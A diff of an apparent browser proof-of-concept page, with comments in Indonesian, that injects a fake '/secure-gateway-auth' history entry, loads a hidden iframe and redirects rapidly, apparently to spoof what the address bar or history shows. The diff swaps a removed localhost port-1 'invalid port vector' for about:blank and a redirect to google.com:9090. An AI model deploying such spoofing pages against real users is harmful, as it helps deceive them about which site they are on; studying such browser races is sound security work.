@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced PoC - Invalid Port Stable Race</title>
+    <title>PoC Direct Port Redirect</title>
     <style>
         body, html {
             margin: 0;
@@ -56,9 +56,9 @@
 
     <div id="blackout-portal">
         <div class="console">
-            <h3>[!] Invalid Port Race Engine</h3>
+            <h3>[!] Port Redirect Engine</h3>
             <div id="status-container">
-                <div class="log-line">> Menginisialisasi port-blocking buffer...</div>
+                <div class="log-line">> Menyiapkan target port buffer...</div>
             </div>
         </div>
     </div>
@@ -78,25 +78,21 @@
             history.pushState({race: true}, "", "/secure-gateway-auth");
             addLog("History state disuntikkan: <span class='highlight'>/secure-gateway-auth</span>");
 
-            // 2. Invalid Port Vector: Menggunakan port terlarang/tidak valid (misal port 1) 
-            // untuk memicu ERR_UNSAFE_PORT atau koneksi gagal instan tanpa indikator "Loading..." yang lama.
-            const invalidPortVector = "http://127.0.0.1:1/nonexistent";
-            
+            // 2. Memicu subframe kosong untuk stabilitas render buffer
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = invalidPortVector;
+            iframe.src = "about:blank";
             document.body.appendChild(iframe);
-            addLog("Invalid port target dilepaskan: <span class='highlight'>Port 1 (Unsafe/Blocked)</span>");
 
-            // 3. Stable Instant Redirect tanpa jeda loading yang menggantung
+            // 3. Auto-Redirect langsung ke google.com dengan port 9090 tanpa loading yang menggantung
             setTimeout(() => {
-                addLog("Memicu redirect stabil ke Google.com...");
-                window.location.replace("https://www.google.com");
-            }, 150); // Eksekusi sangat cepat untuk memotong siklus render loader
+                addLog("Mengarahkan ke google.com:9090...");
+                window.location.replace("https://www.google.com:9090");
+            }, 100);
 
         } catch (err) {
             addLog(`Kesalahan Eksekusi: ${err.message}`);
-            window.location.href = "https://www.google.com";
+            window.location.href = "https://www.google.com:9090";
         }
     </script>
 </body>
